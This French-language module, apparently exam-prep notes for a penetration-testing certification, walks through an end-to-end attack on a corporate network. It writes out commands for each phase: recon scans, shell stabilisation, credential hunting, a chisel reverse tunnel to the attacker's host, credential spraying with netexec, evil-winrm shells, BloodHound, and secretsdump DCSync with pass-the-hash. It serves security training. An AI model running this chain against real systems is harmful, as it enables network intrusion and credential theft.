# 23 — Assembling the Pieces

## Objectifs
Enchaîner tout : scénario type « réseau d'entreprise » de bout en bout, du premier scan au rapport. C'est le module qui ressemble le plus à l'examen.

---

## 1. Scénario de référence

```
Internet → serveur web (Linux) → pivot → poste Windows → DC
```

```
1. Scan externe        → 80, 22
2. Web vuln (LFI/RCE)  → shell www-data
3. Privesc Linux       → root
4. Creds trouvés       → pivot SSH vers réseau interne
5. Scan interne        → 445 sur plusieurs machines
6. SMB / WinRM         → shell user Windows
7. Privesc Windows     → admin local
8. BloodHound          → chemin vers Domain Admin
9. DCSync / Golden     → preuve DA
10. Rapport
```

---

## 2. Phase 1 — Reconnaissance externe

```bash
nmap -p- --min-rate 2000 -T4 -oA ext_all <IP>
nmap -sCV -p<PORTS> -oA ext_svc <IP>
whatweb -a3 http://<IP>
ffuf -u http://<IP>/FUZZ -w raft-medium-directories.txt -mc 200,301,302,403
```

Objectif : **un** point d'entrée. Noter toutes les versions.

---

## 3. Phase 2 — Foothold

```bash
# Choisir la piste la plus probable
# LFI → logs → RCE
# Upload → webshell
# CVE version → PoC
# SQLi → creds → admin panel → upload
```

```bash
# Stabiliser immédiatement
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm
```

```bash
# Preuve + notes
id; hostname; ip a
tee /root/exam/03-loot/<IP>/shell.txt <<< "$(id; hostname)"
```

---

## 4. Phase 3 — Privesc & récolte

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab; ls -la /etc/cron*
ls -la /home/*
find / -name "*.conf" -o -name "id_rsa" 2>/dev/null
```

```bash
# Ce qu'on cherche vraiment : des creds
cat /var/www/html/wp-config.php
grep -ri "password" /var/www /opt /home 2>/dev/null | head -30
```

```bash
# Root
# → preuve
cat /root/proof.txt
```

---

## 5. Phase 4 — Pivot

```bash
ip a; ip route
# Réseau interne détecté : 172.16.5.0/24
```

```bash
# chisel (le plus simple)
# cible
./chisel client <LHOST>:8080 R:socks
# attaquant
./chisel server -p 8080 --reverse
proxychains4 -q nmap -sT -Pn -p22,80,445,3389,5985 172.16.5.0/24
```

```bash
# Ou SSH si creds
ssh -D 1080 -N -f <USER>@<PIVOT>
proxychains4 -q netexec smb 172.16.5.0/24 -u <USER> -p <PASS>
```

---

## 6. Phase 5 — Windows foothold

```bash
# Trouver où les creds fonctionnent
netexec smb 172.16.5.0/24 -u <USER> -p <PASS> --continue-on-success
netexec winrm 172.16.5.0/24 -u <USER> -p <PASS> --continue-on-success

# Shell
evil-winrm -i 172.16.5.20 -u <USER> -p <PASS>
# ou
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@172.16.5.20
```

```cmd
whoami /all
systeminfo
net localgroup administrators
cmdkey /list
```

---

## 7. Phase 6 — AD

```bash
netexec smb <DC_IP> -u <USER> -p <PASS> --users --shares --pass-pol
bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c All
```

Chemin typique :
```
utilisateur → GenericAll sur groupe → ajout au groupe → admin local sur serveur
→ dump → hash admin local réutilisé → admin sur DC → DCSync
```

```bash
# Exemple concret
net rpc group addmem "IT Admins" <USER> -U <DOMAIN>/<USER>%<PASS> -S <DC_IP>
netexec smb 172.16.5.30 -u <USER> -p <PASS> --local-auth
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@172.16.5.30
netexec smb <DC_IP> -u Administrator -H <NTHASH>
impacket-secretsdump <DOMAIN>/Administrator@<DC_IP> -just-dc-ntlm
```

---

## 8. Phase 7 — Preuve & rapport

```bash
# Preuves
cat /root/proof.txt
type C:\Users\Administrator\Desktop\proof.txt
hostname; whoami; ipconfig
```

```bash
# Timeline
10:02 scan
10:15 LFI
10:22 shell www-data
10:40 root (SUID find)
11:05 pivot
11:30 SMB 172.16.5.20
12:00 admin local (service unquoted)
12:30 BloodHound → GenericAll
13:00 DA
```

Chaque finding : titre, sévérité, preuve, impact, remédiation (voir module 04).

---

## 9. Erreurs de scénario

| Erreur | Effet |
|---|---|
| Ne pas stabiliser le shell | impossible de lancer `su`, `ssh` |
| Oublier de scanner le réseau interne | pas de pivot |
| Ne pas tester les creds sur tout le subnet | blocage artificiel |
| Ignorer BloodHound | chemin invisible |
| Utiliser MSF sur 2 machines | moteur invalidé |
| Pas de notes | rapport bâclé |
| Casser un service critique | perte de la cible |

---

## 10. Checklist du scénario complet

- [ ] Scan externe complet + versions
- [ ] Foothold obtenu
- [ ] Shell stabilisé
- [ ] Privesc root/admin
- [ ] Creds récoltés et testés partout
- [ ] Interfaces internes cartographiées
- [ ] Pivot monté
- [ ] Scan interne
- [ ] Foothold Windows
- [ ] BloodHound + chemin
- [ ] Accès DC prouvé
- [ ] Timeline et preuves complètes
